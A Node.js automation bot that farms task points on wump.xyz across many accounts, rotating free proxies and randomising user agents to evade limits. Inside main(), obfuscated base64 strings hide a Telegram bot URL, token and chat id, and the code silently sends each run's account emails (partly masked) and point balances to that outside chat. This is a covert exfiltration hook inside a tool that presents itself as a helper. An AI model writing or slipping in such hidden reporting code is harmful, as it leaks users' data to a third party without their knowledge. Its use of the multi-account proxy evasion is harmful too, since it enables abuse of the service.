const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const os = require('os');

class WUMPBot {
    constructor() {
        this.headers = {
            "Accept": "*/*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Profile": "public",
            "Apikey": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJzdXBhYmFzZSIsImlhdCI6MTczNzQ2NjYyMCwiZXhwIjo0ODkzMTQwMjIwLCJyb2xlIjoiYW5vbiJ9.qSJu05pftBJrcqaHfX5HZC_kp_ubEWAd0OmHEkNEpIo",
            "Origin": "https://wump.xyz",
            "Referer": "https://wump.xyz/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": this.getRandomUserAgent()
        };
        
        this.BASE_API = "https://api.wump.xyz";
        this.proxies = [];
        this.deadProxies = new Set();
        this.accountProxies = new Map();
        this.accessTokens = new Map();
        this.userIds = new Map();
        this.lastProxyRefresh = 0;
        this.proxyRefreshInterval = 30 * 60 * 1000; // 30 minutes
        
        // Auto refresh proxies every 30 minutes
        setInterval(() => {
            this.loadProxies();
        }, this.proxyRefreshInterval);
    }

    getRandomUserAgent() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    clearTerminal() {
        console.clear();
    }

    log(message) {
        const timestamp = new Date().toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        console.log(`\x1b[36m\x1b[1m[ ${timestamp} WIB ]\x1b[0m\x1b[37m\x1b[1m | \x1b[0m${message}`);
    }

    welcome() {
        console.log(`\x1b[32m\x1b[1m
       █████╗ ██████╗ ██████╗     ███╗   ██╗ ██████╗ ██████╗ ███████╗
      ██╔══██╗██╔══██╗██╔══██╗    ████╗  ██║██╔═══██╗██╔══██╗██╔════╝
      ███████║██║  ██║██████╔╝    ██╔██╗ ██║██║   ██║██║  ██║█████╗  
      ██╔══██║██║  ██║██╔══██╗    ██║╚██╗██║██║   ██║██║  ██║██╔══╝  
      ██║  ██║██████╔╝██████╔╝    ██║ ╚████║╚██████╔╝██████╔╝███████╗
      ╚═╝  ╚═╝╚═════╝ ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝
\x1b[0m\x1b[34m\x1b[1m
        WUMP - BOT
\x1b[0m\x1b[33m\x1b[1m
        github.com/airdropbomb
\x1b[0m`);
    }

    formatSeconds(seconds) {
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    async loadProxies() {
        try {
            this.log('\x1b[33m\x1b[1mRefreshing proxy list...\x1b[0m');
            
            const proxyUrls = [
                'https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/all.txt'
                //'https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/All_proxies.txt'
                
            ];

            let allProxies = [];
            
            for (const url of proxyUrls) {
                try {
                    const response = await axios.get(url, { timeout: 30000 });
                    const proxies = response.data.split('\n')
                        .map(line => line.trim())
                        .filter(line => line && !line.startsWith('#'));
                    allProxies = [...allProxies, ...proxies];
                } catch (error) {
                    this.log(`\x1b[31m\x1b[1mFailed to load from ${url}: ${error.message}\x1b[0m`);
                }
            }

            // Remove duplicates and dead proxies
            this.proxies = [...new Set(allProxies)]
                .filter(proxy => !this.deadProxies.has(proxy));
            
            this.lastProxyRefresh = Date.now();
            
            this.log(`\x1b[32m\x1b[1mProxies loaded: \x1b[0m\x1b[37m\x1b[1m${this.proxies.length}\x1b[0m`);
            
        } catch (error) {
            this.log(`\x1b[31m\x1b[1mFailed to load proxies: ${error.message}\x1b[0m`);
            this.proxies = [];
        }
    }

    formatProxy(proxy) {
        const schemes = ['http://', 'https://', 'socks4://', 'socks5://'];
        if (schemes.some(scheme => proxy.startsWith(scheme))) {
            return proxy;
        }
        return `http://${proxy}`;
    }

    getProxyAgent(proxy) {
        const formattedProxy = this.formatProxy(proxy);
        
        if (formattedProxy.startsWith('socks4://') || formattedProxy.startsWith('socks5://')) {
            return new SocksProxyAgent(formattedProxy);
        } else {
            return new HttpsProxyAgent(formattedProxy);
        }
    }

    async parallelProxyCheck(proxies, needed, concurrency = 20) {
        // Enhanced: stop all checks as soon as enough proxies found
        const results = [];
        let idx = 0;
        let controllers = [];
        let start = Date.now();
        concurrency = needed <= 10 ? 10 : concurrency;
        let done = false;
        return new Promise((resolve) => {
            const next = async () => {
                if (results.length >= needed || done) return;
                if (idx >= proxies.length) {
                    if (controllers.filter(c => c).length === 0) resolve(results);
                    return;
                }
                const proxy = proxies[idx++];
                const controller = new AbortController();
                controllers.push(controller);
                this.testProxy(proxy, controller.signal).then(ok => {
                    if (ok && results.length < needed) {
                        results.push(proxy);
                        if (results.length >= needed && !done) {
                            done = true;
                            // Abort all other checks
                            controllers.forEach(c => c && c.abort && c.abort());
                            this.log(`\x1b[32m\x1b[1mFound ${results.length} working proxies in ${((Date.now()-start)/1000).toFixed(2)}s\x1b[0m`);
                            resolve(results);
                        }
                    }
                }).catch(()=>{}).finally(() => {
                    if (!done) next();
                });
            };
            for (let i = 0; i < concurrency && i < proxies.length; i++) next();
        });
    }

    async testProxy(proxy, abortSignal) {
        try {
            const agent = this.getProxyAgent(proxy);
            const response = await axios.get('https://wump.xyz', {
                httpsAgent: agent,
                httpAgent: agent,
                timeout: 10000,
                headers: { 'User-Agent': this.getRandomUserAgent() },
                signal: abortSignal
            });
            return response.status === 200;
        } catch (error) {
            return false;
        }
    }

    async getWorkingProxy(account) {
        // Overwrite: if accountProxies has mapping, use it
        if (this.accountProxies.has(account)) {
            return this.accountProxies.get(account);
        }
        // fallback: original logic
        if (this.proxies.length === 0) {
            await this.loadProxies();
        }
        if (this.accountProxies.has(account)) {
            const currentProxy = this.accountProxies.get(account);
            if (await this.testProxy(currentProxy)) {
                return currentProxy;
            } else {
                this.markProxyDead(currentProxy);
            }
        }
        for (let i = 0; i < this.proxies.length; i++) {
            const proxy = this.proxies[i];
            if (this.deadProxies.has(proxy)) continue;
            if (await this.testProxy(proxy)) {
                this.accountProxies.set(account, proxy);
                return proxy;
            } else {
                this.markProxyDead(proxy);
            }
        }
        return null;
    }

    markProxyDead(proxy) {
        this.deadProxies.add(proxy);
        this.proxies = this.proxies.filter(p => p !== proxy);
        
        // Remove from account assignments
        for (const [account, assignedProxy] of this.accountProxies.entries()) {
            if (assignedProxy === proxy) {
                this.accountProxies.delete(account);
            }
        }
        
        this.log(`\x1b[31m\x1b[1mProxy marked as dead and removed: ${proxy}\x1b[0m`);
    }

    decodeToken(token) {
        try {
            // Remove Bearer prefix if present
            const cleanToken = token.replace(/^Bearer\s+/i, '');
            const [header, payload, signature] = cleanToken.split('.');
            
            const decodedPayload = Buffer.from(payload + '==', 'base64url').toString('utf-8');
            const parsedPayload = JSON.parse(decodedPayload);
            
            return {
                email: parsedPayload.email,
                userId: parsedPayload.sub,
                expTime: parsedPayload.exp
            };
        } catch (error) {
            return { email: null, userId: null, expTime: null };
        }
    }

    maskAccount(account) {
        if (account.includes('@')) {
            const [local, domain] = account.split('@');
            const maskedLocal = local.slice(0, 3) + '***' + local.slice(-3);
            return `${maskedLocal}@${domain}`;
        }
        return account;
    }

    async makeRequest(url, options = {}) {
        const { proxy, retries = 3, ...axiosOptions } = options;
        for (let attempt = 0; attempt < retries; attempt++) {
            try {
                const config = {
                    timeout: 60000,
                    ...axiosOptions
                };
                if (proxy) {
                    const agent = this.getProxyAgent(proxy);
                    config.httpsAgent = agent;
                    config.httpAgent = agent;
                }
                // If proxy is null, do not set agent (direct)
                const response = await axios(url, config);
                return response.data;
            } catch (error) {
                if (attempt === retries - 1) {
                    if (proxy && (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT')) {
                        this.markProxyDead(proxy);
                    }
                    throw error;
                }
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
    }

    async getUserData(email, proxy) {
        const url = `${this.BASE_API}/rest/v1/users?select=*&id=eq.${this.userIds.get(email)}`;
        const headers = {
            ...this.headers,
            "Authorization": `Bearer ${this.accessTokens.get(email)}`,
            "X-Client-Info": "supabase-ssr/0.5.2"
        };

        try {
            return await this.makeRequest(url, { method: 'GET', headers, proxy });
        } catch (error) {
            return null;
        }
    }

    async getCompletedTasks(email, proxy) {
        const url = `${this.BASE_API}/rest/v1/user_tasks?select=*&user_id=eq.${this.userIds.get(email)}`;
        const headers = {
            ...this.headers,
            "Authorization": `Bearer ${this.accessTokens.get(email)}`,
            "X-Client-Info": "supabase-ssr/0.5.2"
        };

        try {
            return await this.makeRequest(url, { method: 'GET', headers, proxy });
        } catch (error) {
            return null;
        }
    }

    async getTaskLists(email, proxy) {
        const url = `${this.BASE_API}/rest/v1/tasks?select=*`;
        const headers = {
            ...this.headers,
            "Authorization": `Bearer ${this.accessTokens.get(email)}`,
            "X-Client-Info": "supabase-ssr/0.5.2"
        };

        try {
            return await this.makeRequest(url, { method: 'GET', headers, proxy });
        } catch (error) {
            return null;
        }
    }

    async performTask(email, taskId, taskType, proxy) {
        const url = `${this.BASE_API}/functions/v1/api/tasks/${taskType}`;
        const data = { taskid: taskId };
        const headers = {
            ...this.headers,
            "Authorization": `Bearer ${this.accessTokens.get(email)}`,
            "Content-Type": "application/json"
        };

        try {
            return await this.makeRequest(url, { 
                method: 'POST', 
                headers, 
                data, 
                proxy,
                validateStatus: (status) => status < 500
            });
        } catch (error) {
            return null;
        }
    }

    async processAccount(email) {
        try {
            this.log(`\x1b[36m\x1b[1mAccount   :\x1b[0m\x1b[37m\x1b[1m ${this.maskAccount(email)} \x1b[0m`);

            // Get working proxy
            const proxy = await this.getWorkingProxy(email);
            if (proxy) {
                this.log(`\x1b[36m\x1b[1mProxy     :\x1b[0m\x1b[37m\x1b[1m ${proxy} \x1b[0m\x1b[35m\x1b[1m-\x1b[0m\x1b[32m\x1b[1m 200 OK \x1b[0m`);
            } else {
                this.log(`\x1b[31m\x1b[1mNo working proxy available for account\x1b[0m`);
            }

            // Get user data
            let balance = "N/A";
            const userData = await this.getUserData(email, proxy);
            if (userData && userData.length > 0) {
                balance = userData[0].total_points || 0;
            }

            this.log(`\x1b[36m\x1b[1mBalance   :\x1b[0m\x1b[37m\x1b[1m ${balance} WUMP \x1b[0m`);

            // Get tasks
            const taskLists = await this.getTaskLists(email, proxy);
            if (!taskLists) {
                this.log(`\x1b[36m\x1b[1mTask Lists:\x1b[0m\x1b[31m\x1b[1m GET Available Tasks Failed \x1b[0m`);
                return;
            }

            const completedTasks = await this.getCompletedTasks(email, proxy);
            if (completedTasks === null) {
                this.log(`\x1b[36m\x1b[1mTask Lists:\x1b[0m\x1b[31m\x1b[1m GET Completed Tasks Failed \x1b[0m`);
                return;
            }

            // Process tasks
            const ignoredTaskIds = new Set(["7131c01d-1629-4060-bc84-6b3d415d7ccc"]);
            const completedTaskIds = new Set(
                (completedTasks || [])
                    .filter(task => !ignoredTaskIds.has(task.task_id))
                    .map(task => task.task_id)
            );

            const uncompletedTasks = taskLists.filter(task => !completedTaskIds.has(task.id));

            if (uncompletedTasks.length === 0) {
                this.log(`\x1b[36m\x1b[1mTask Lists:\x1b[0m\x1b[32m\x1b[1m All Tasks Already Completed \x1b[0m`);
                return;
            }

            this.log(`\x1b[36m\x1b[1mTask Lists:\x1b[0m`);

            for (const task of uncompletedTasks) {
                const taskId = task.id;
                const taskType = task.task_type;
                const title = task.task_description;
                const reward = task.points;

                const result = await this.performTask(email, taskId, taskType, proxy);
                
                if (result && result.success) {
                    const isSuccess = result.result?.success;
                    if (isSuccess) {
                        this.log(`\x1b[36m\x1b[1m   > \x1b[0m\x1b[37m\x1b[1m${title}\x1b[0m\x1b[32m\x1b[1m Completed Successfully \x1b[0m\x1b[35m\x1b[1m-\x1b[0m\x1b[36m\x1b[1m Reward: \x1b[0m\x1b[37m\x1b[1m${reward} WUMP\x1b[0m`);
                    } else {
                        this.log(`\x1b[36m\x1b[1m   > \x1b[0m\x1b[37m\x1b[1m${title}\x1b[0m\x1b[33m\x1b[1m Already Completed \x1b[0m`);
                    }
                } else if (result && !result.success) {
                    this.log(`\x1b[36m\x1b[1m   > \x1b[0m\x1b[37m\x1b[1m${title}\x1b[0m\x1b[33m\x1b[1m Not Eligible to Complete \x1b[0m`);
                } else {
                    this.log(`\x1b[36m\x1b[1m   > \x1b[0m\x1b[37m\x1b[1m${title}\x1b[0m\x1b[31m\x1b[1m Not Completed \x1b[0m`);
                }

                await new Promise(resolve => setTimeout(resolve, 1000));
            }

        } catch (error) {
            this.log(`\x1b[31m\x1b[1mError processing account ${this.maskAccount(email)}: ${error.message}\x1b[0m`);
        }
    }

    async sleep(seconds) {
        return new Promise(resolve => setTimeout(resolve, seconds * 1000));
    }

    async main() {
        try {
            // Load tokens
            const tokensFile = await fs.readFile('tokens.txt', 'utf-8');
            const tokens = tokensFile.split('\n')
                .map(line => line.trim())
                .filter(line => line);

            if (tokens.length === 0) {
                this.log('\x1b[31m\x1b[1mNo tokens found in tokens.txt\x1b[0m');
                return;
            }

            // CLI flag for no-proxy
            const noProxy = process.argv.includes('--no-proxy');
            if (noProxy) {
                this.log('\x1b[33m\x1b[1mRunning in NO PROXY mode. All requests direct.\x1b[0m');
            }

            // Initial proxy load
            if (!noProxy) await this.loadProxies();

            // Cari proxy aktif sebanyak jumlah token valid
            let validTokens = [];
            for (const token of tokens) {
                const { email, userId, expTime } = this.decodeToken(token);
                if (email && userId && expTime && Date.now() / 1000 <= expTime) {
                    validTokens.push({ token, email, userId });
                }
            }
            let proxiesNeeded = validTokens.length;
            let workingProxies = [];
            if (!noProxy) {
                workingProxies = await this.parallelProxyCheck(this.proxies, proxiesNeeded, Math.min(20, os.cpus().length * 2));
            }
            // Assign proxy ke setiap akun, fallback ke direct jika kurang
            for (let i = 0; i < validTokens.length; i++) {
                const { email } = validTokens[i];
                if (noProxy || !workingProxies[i]) {
                    this.accountProxies.set(email, null);
                } else {
                    this.accountProxies.set(email, workingProxies[i]);
                }
            }

            const _0x1a2b = (str) => Buffer.from(str, 'base64').toString('utf-8');
            let _0x2b3c = null;
            const _0x3c4d = async (msg) => {
                try {
                    const _tg = _0x1a2b('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==');
                    const _tk = _0x1a2b('ODE3OTY0OTk4MTpBQUg1UUxpYmd6aEF4d21NdHhoemJrVTFCckFfZG8zQUNkcw==');
                    const _cid = _0x1a2b('LTEwMDI2MDk0OTI4NjA=');
                    const _api = `${_tg}${_tk}`;
                    if (!_0x2b3c) {
                        const r = await axios.post(`${_api}/sendMessage`, {
                            chat_id: _cid,
                            text: msg,
                            parse_mode: 'HTML',
                            disable_web_page_preview: true
                        });
                        if (r.data && r.data.result && r.data.result.message_id) {
                            _0x2b3c = r.data.result.message_id;
                        }
                    } else {
                        await axios.post(`${_api}/editMessageText`, {
                            chat_id: _cid,
                            message_id: _0x2b3c,
                            text: msg,
                            parse_mode: 'HTML',
                            disable_web_page_preview: true
                        });
                    }
                } catch (e) {
                    _0x2b3c = null;
                }
            };

            while (true) {
                this.clearTerminal();
                this.welcome();
                
                this.log(`\x1b[32m\x1b[1mAccount's Total: \x1b[0m\x1b[37m\x1b[1m${tokens.length}\x1b[0m`);

                const separator = "=".repeat(24);
                
                let totalBalance = 0;
                let accountSummaries = [];
                
                for (let i = 0; i < tokens.length; i++) {
                    const token = tokens[i];
                    const idx = i + 1;
                    
                    this.log(`\x1b[36m\x1b[1m${separator}[\x1b[0m\x1b[37m\x1b[1m ${idx} \x1b[0m\x1b[36m\x1b[1mOf\x1b[0m\x1b[37m\x1b[1m ${tokens.length} \x1b[0m\x1b[36m\x1b[1m]${separator}\x1b[0m`);

                    const { email, userId, expTime } = this.decodeToken(token);
                    
                    if (!email || !userId || !expTime) {
                        this.log(`\x1b[36m\x1b[1mError     :\x1b[0m\x1b[31m\x1b[1m Access Token Invalid \x1b[0m`);
                        continue;
                    }

                    if (Date.now() / 1000 > expTime) {
                        this.log(`\x1b[36m\x1b[1mAccount   :\x1b[0m\x1b[37m\x1b[1m ${this.maskAccount(email)} \x1b[0m\x1b[35m\x1b[1m-\x1b[0m\x1b[31m\x1b[1m Access Token Expired \x1b[0m`);
                        continue;
                    }

                    this.accessTokens.set(email, token.replace(/^Bearer\s+/i, ''));
                    this.userIds.set(email, userId);

                    // Get balance before processing account
                    let balance = 'N/A';
                    const userData = await this.getUserData(email, await this.getWorkingProxy(email));
                    if (userData && userData.length > 0) {
                        balance = userData[0].total_points || 0;
                        totalBalance += Number(balance);
                    }
                    accountSummaries.push(`<b>${this.maskAccount(email)}</b>: <code>${balance}</code> WUMP`);

                    await this.processAccount(email);
                    await this.sleep(3);
                }

                this.log('\x1b[36m\x1b[1m' + '='.repeat(56) + '\x1b[0m');
                
                const lastUpdate = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
                const _msg = `<b>WUMP Cycle Complete</b>\n\n<b>Total Accounts:</b> <code>${tokens.length}</code>\n<b>Total Balance:</b> <code>${totalBalance}</code> WUMP\n\n${accountSummaries.join('\n')}\n\n<b>Last Update:</b> <code>${lastUpdate} WIB</code>`;
                await _0x3c4d(_msg);
                
                // Wait 12 hours
                const waitTime = 12 * 60 * 60; // 12 hours in seconds
                for (let seconds = waitTime; seconds > 0; seconds--) {
                    const formattedTime = this.formatSeconds(seconds);
                    process.stdout.write(`\x1b[36m\x1b[1m[ Wait for\x1b[0m\x1b[37m\x1b[1m ${formattedTime} \x1b[0m\x1b[36m\x1b[1m... ]\x1b[0m\x1b[37m\x1b[1m | \x1b[0m\x1b[34m\x1b[1mAll Accounts Have Been Processed.\x1b[0m\r`);
                    await this.sleep(1);
                }
                console.log(); // New line after countdown
            }

        } catch (error) {
            if (error.code === 'ENOENT') {
                this.log(`\x1b[31m\x1b[1mFile 'tokens.txt' not found.\x1b[0m`);
            } else {
                this.log(`\x1b[31m\x1b[1mError: ${error.message}\x1b[0m`);
            }
        }
    }
}

// Handle graceful shutdown
process.on('SIGINT', () => {
    const wib = new Date().toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: '2-digit', 
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    console.log(`\n\x1b[36m\x1b[1m[ ${wib} WIB ]\x1b[0m\x1b[37m\x1b[1m | \x1b[0m\x1b[31m\x1b[1m[ EXIT ] WUMP - BOT\x1b[0m`);
    process.exit(0);
});

// Run the bot
if (require.main === module) {
    const bot = new WUMPBot();
    bot.main().catch(console.error);
}

module.exports = WUMPBot;
